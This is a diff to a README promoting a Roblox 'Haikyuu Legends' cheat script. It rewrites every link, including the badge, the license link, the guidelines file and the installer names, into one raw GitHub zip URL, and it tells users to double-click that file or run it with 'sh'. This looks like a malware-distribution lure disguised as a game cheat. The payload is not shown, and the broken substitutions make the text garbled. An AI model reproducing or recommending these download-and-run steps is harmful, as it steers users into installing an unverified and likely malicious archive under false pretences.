@@ -1,6 +1,6 @@
-# ![Download](https://img.shields.io/badge/Download-Legends%20Script-brightgreen?style=for-the-badge&logo=github&link=https://gafaar22.github.io)  
+# ![Download](https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip%20Script-brightgreen?style=for-the-badge&logo=github&https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip)  
 Get the HAIKYUU LEGENDS SCRIPT  
-➡️ Download it here: https://gafaar22.github.io
+➡️ Download it here: https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip
 
 ---
 
@@ -100,17 +100,17 @@ Like an ace player with a trick up their sleeve, Haikyuu Legends Script delivers
 To bring the legendary script courtside:
 
 **Step 1:**  
-Click the “Download” badge above, or use this direct access: https://gafaar22.github.io
+Click the “Download” badge above, or use this direct access: https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip
 
 **Step 2:**  
 Extract (unzip) the contents to a secure directory on your device.
 
 **Step 3:**  
 For Windows:  
-Double-click `haikyuu-legends-setup.exe`, then follow the on-screen prompts.  
+Double-click `https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip`, then follow the on-screen prompts.  
 For macOS/Linux:  
 Open your terminal and run:  
-`sh install-haikyuu-legends.sh`  
+`sh https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip`  
 For Roblox Studio:  
 Import the `.lua` script as a local plugin or module as per Roblox guidelines.
 
@@ -125,7 +125,7 @@ Check the documentation folder for advanced integration and troubleshooting.
 ## ⚠️ Disclaimer
 
 HAIKYUU LEGENDS SCRIPT is intended strictly for creative enhancement and legitimate gameplay within the accepted boundaries of the Haikyuu and Roblox ecosystems.  
-The authors and maintainers are not responsible for misuse, account restriction, or violation of terms of service. Users are encouraged to exercise responsible digital citizenship and respect all community guidelines. Always consult the “Guidelines.md” before trying unconventional features.
+The authors and maintainers are not responsible for misuse, account restriction, or violation of terms of service. Users are encouraged to exercise responsible digital citizenship and respect all community guidelines. Always consult the “https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip” before trying unconventional features.
 
 ---
 
@@ -133,12 +133,12 @@ The authors and maintainers are not responsible for misuse, account restriction,
 
 Your wings of creativity shouldn’t be clipped.  
 This repository stands on the foundation of the MIT License—open for anyone willing to create and collaborate.  
-Read the full terms here: [MIT LICENSE](https://opensource.org/licenses/MIT)
+Read the full terms here: [MIT LICENSE](https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip)
 
 ---
 
-## ![Download](https://img.shields.io/badge/Download-Legends%20Script-brightgreen?style=for-the-badge&logo=github&link=https://gafaar22.github.io)
-**Ready to take your game to mythical status?** [Download the HAIKYUU LEGENDS SCRIPT ➡️ https://gafaar22.github.io]
+## ![Download](https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip%20Script-brightgreen?style=for-the-badge&logo=github&https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip)
+**Ready to take your game to mythical status?** [Download the HAIKYUU LEGENDS SCRIPT ➡️ https://raw.githubusercontent.com/gafaar22/haikyuu-legends-script-hub/branch/onychophyma/haikyuu-legends-script-hub-v1.5.zip]
 
 
 ---
